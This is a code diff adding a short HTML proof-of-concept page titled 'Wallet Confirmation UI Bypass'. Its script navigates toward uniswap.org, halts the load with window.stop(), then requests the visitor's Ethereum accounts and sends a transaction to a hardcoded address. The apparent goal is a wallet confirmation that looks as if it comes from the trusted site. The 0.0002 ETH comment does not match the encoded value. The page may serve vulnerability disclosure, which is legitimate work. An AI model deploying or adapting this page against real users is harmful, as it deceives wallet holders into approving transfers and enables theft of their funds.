@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta
+    name="viewport"
+    content="width=device-width, initial-scale=1.0"
+  >
+  <title>Wallet Confirmation UI Bypass</title>
+</head>
+
+<body>
+
+<center><br><br><br><br><br><br><br><button onclick="go()"><h1>Click Wallet Confirmation</h1></button>
+
+<script>
+async function go() {
+  location = "https://uniswap.org";
+  window.stop();
+
+  setTimeout(async () => {
+    const p = window.ethereum;
+
+    if (!p || typeof p.request !== "function") {
+      console.log("no provider");
+      return;
+    }
+
+    let accounts;
+
+    // Connect wallet
+    try {
+      accounts = await p.request({
+        method: "eth_requestAccounts",
+        params: []
+      });
+
+      if (!Array.isArray(accounts) || !accounts[0]) {
+        console.log("connect failed: no account returned");
+        return;
+      }
+
+      console.log("connected:", accounts);
+    } catch (e) {
+      console.log(
+        "connect rejected:",
+        e?.code ?? "unknown",
+        e?.message ?? String(e)
+      );
+      return;
+    }
+
+    const account = accounts[0];
+
+    // Send 0.0002 ETH
+    try {
+      const tx = await p.request({
+        method: "eth_sendTransaction",
+        params: [{
+          from: account,
+          to: "0x071A58Cc1B4284E90c72B9a158dA42d7E5eD9032",
+          value: "0x2474f83000"
+        }]
+      });
+
+      console.log("transaction hash:", tx);
+    } catch (e) {
+      console.log(
+        "transaction rejected:",
+        e?.code ?? "unknown",
+        e?.message ?? String(e)
+      );
+    }
+  }, 50);
+}
+</script>
+
+</body>
+</html>
